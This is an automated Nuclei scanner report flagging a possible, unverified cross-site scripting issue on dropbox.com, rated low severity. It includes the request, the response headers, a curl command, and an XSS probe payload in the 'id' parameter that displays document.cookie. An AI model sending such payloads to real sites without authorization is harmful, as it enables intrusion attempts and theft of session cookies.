### Id XSS - Cross-Site Scripting (id-xss) found on https://www.dropbox.com

----
**Details**: **id-xss** matched at https://www.dropbox.com

**Protocol**: HTTP

**Full URL**: https://www.dropbox.com/?id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

**Timestamp**: Sat Dec 9 15:16:53 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Id XSS - Cross-Site Scripting |
| Authors | yarovit |
| Tags | xss, id |
| Severity | low |
| Description | A cross-site scripting vulnerability was discovered via id testing. Manual testing is needed to verify exploitation. |

**Request**
```http
GET /?id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: www.dropbox.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Cookie: gvc=Mjk2NDIxNTIwNzA1OTMxMjg0NDMzMjc4Nzk5NDI3ODA0OTI3NjE5; t=LQUByulgaxTNp24wON9fIBmB; __Host-js_csrf=LQUByulgaxTNp24wON9fIBmB; locale=en; __Host-logged-out-session=ChA1KEsg3BzN%2FoV0%2FHtfauZrENyJ0qsGGi5BSVk2QnNxQ2FjWWhNOUhfUzhNV3BqeHQ5cTRhd2dEeEY2Sk9HWlJWOXpkZXRn
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Accept-Encoding: identity,gzip
Cache-Control: no-cache, no-store
Content-Security-Policy: base-uri 'self' ; child-src https://www.dropbox.com/static/serviceworker/ blob: ; connect-src https://* ws://127.0.0.1:*/ws wss://dsimports.dropbox.com/ ; default-src 'none' ; font-src https://* data: ; form-action 'self' https://www.dropbox.com/ https://dl-web.dropbox.com/ https://photos.dropbox.com/ https://paper.dropbox.com/ https://showcase.dropbox.com/ https://www.hellofax.com/ https://app.hellofax.com/ https://www.hellosign.com/ https://app.hellosign.com/ https://docsend.com/ https://www.docsend.com/ https://help.dropbox.com/ https://navi.dropbox.jp/ https://a.sprig.com/ https://selfguidedlearning.dropboxbusiness.com/ https://instructorledlearning.dropboxbusiness.com/ https://sales.dropboxbusiness.com/ https://accounts.google.com/ https://api.login.yahoo.com/ https://login.yahoo.com/ https://experience.dropbox.com/ https://pal-test.adyen.com https://2e83413d8036243b-Dropbox-pal-live.adyenpayments.com/ ; frame-src https://* carousel: dbapi-6: dbapi-7: dbapi-8: dropbox-client: itms-apps: itms-appss: ; img-src https://* data: blob: ; media-src https://* blob: ; object-src 'self' https://cfl.dropboxstatic.com/static/ https://www.dropboxstatic.com/static/ ; report-uri https://www.dropbox.com/csp_log?policy_name=metaserver-whitelist ; script-src 'unsafe-eval' https://www.dropbox.com/static/api/ https://www.dropbox.com/page_success/ https://cfl.dropboxstatic.com/static/ https://www.dropboxstatic.com/static/ https://accounts.google.com/gsi/client https://canny.io/sdk.js 'nonce-U6A2v9Ki+hvenMAEIMzn' ; style-src https://* 'unsafe-inline' 'unsafe-eval' ; worker-src https://www.dropbox.com/static/serviceworker/ https://www.dropbox.com/encrypted_folder_download/service_worker.js blob:
Content-Type: text/html; charset=utf-8
Date: Sat, 09 Dec 2023 15:16:52 GMT
Referrer-Policy: strict-origin-when-cross-origin
Server: envoy
Set-Cookie: t=LQUByulgaxTNp24wON9fIBmB; Domain=dropbox.com; expires=Tue, 08 Dec 2026 15:16:51 GMT; HttpOnly; Path=/; Secure
Set-Cookie: __Host-js_csrf=LQUByulgaxTNp24wON9fIBmB; expires=Tue, 08 Dec 2026 15:16:51 GMT; Path=/; Secure
Set-Cookie: __Host-ss=iSgJtue4Wk; expires=Tue, 08 Dec 2026 15:16:51 GMT; HttpOnly; Path=/; SameSite=Strict; Secure
Strict-Transport-Security: max-age=31536000; includeSubDomains
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Dropbox-Request-Id: deffda6b8db24a7aa95c475812e0e31f
X-Dropbox-Response-Origin: far_remote
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-Xss-Protection: 1; mode=block

<!DOCTYPE html><html class="maestro maestro--responsive global-header" lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml"><head><script nonce="U6A2v9Ki+hvenMAEIMzn">
window._goch_ = {};
window.addEventListener('click', function(event) {
    'use strict';
    for (var elm = event.target; elm; elm = elm.parentElement) {
        if (elm.id &&
            window._goch_.hasOwnProperty(elm.id) &&
            window._goch_[elm.id].call(elm, event) === false) {
            event.preventDefault();
        }
    }
}, true);
window._csp_external_script_nonce = "OQ3R4vzv09A2WMBnoEaR"</script><link href="https://cfl.dropboxstatic.com" rel="preconnect" /><link href="https://cfl.dropboxstatic.com/static/metaserver/static/images/favicon-vfl8lUR9B.ico" rel="shortcut icon" /><title>Dropbox.com</title><meta content="all" name="robots" /><link href="https://www.dropbox.com/" rel="canonical" /><link href="https://www.dropbox.com/da_DK/" hreflang="da-dk" rel="alternate" /><link href="https://www.dropbox.com/de/" hreflang="de-de" rel="alternate" /><link href="https://www.dropbox.com/" hreflang="en" rel="alternate" /><link href="https://www.dropbox.com/en_GB/" hreflang="en-gb" rel="alternate" /><link href="https://www.dropbox.com/es/" hreflang="es" rel="alternate" /><link href="https://www.dropbox.com/es_ES/" hreflang="es-es" rel="alternate" /><link href="https://www.dropbox.com/fr/" hreflang="fr" rel="alternate" /><link href="https://www.dropbox.com/fr_CA/" hreflang="fr-ca" rel="alternate" /><link href="https://www.dropbox.com/id/" hreflang="id-id" rel="alternate" /><link href="https://www.dropbox.com/it/" hreflang="it-it" rel="alternate" /><link href="https://www.dropbox.com/ja/" hreflang="ja-jp" rel="alternate" /><link href="https://www.dropbox.com/ko/" hreflang="ko-kr" rel="alternate" /><link href="https://www.dropbox.com/ms/" hreflang="ms-my" rel="alternate" /><link href="https://www.dropbox.com/nb_NO/" hreflang="nb-no" rel="alternate" /><link href="https://www.dropbox.com/nl_NL/" hreflang="nl-nl" rel="alternate" /><link href="https://www.dropbox.com/pl/" hreflang="pl-pl" rel="alternate" /><link href="https://www.dropbox.com/pt_BR/" hreflang="pt-br" rel="alternate" /><link href="https://www.dropbox.com/ru/" hreflang="ru-ru" rel="alternate" /><link href="https://www.dropbox.com/sv_SE/" hreflang="sv-se" rel="alternate" /><link href="https://www.dropbox.com.... Truncated ....
```


**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: gvc=Mjk2NDIxNTIwNzA1OTMxMjg0NDMzMjc4Nzk5NDI3ODA0OTI3NjE5; t=LQUByulgaxTNp24wON9fIBmB; __Host-js_csrf=LQUByulgaxTNp24wON9fIBmB; locale=en; __Host-logged-out-session=ChA1KEsg3BzN%2FoV0%2FHtfauZrENyJ0qsGGi5BSVk2QnNxQ2FjWWhNOUhfUzhNV3BqeHQ5cTRhd2dEeEY2Sk9HWlJWOXpkZXRn' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'https://www.dropbox.com/?id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E'
```

----

Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)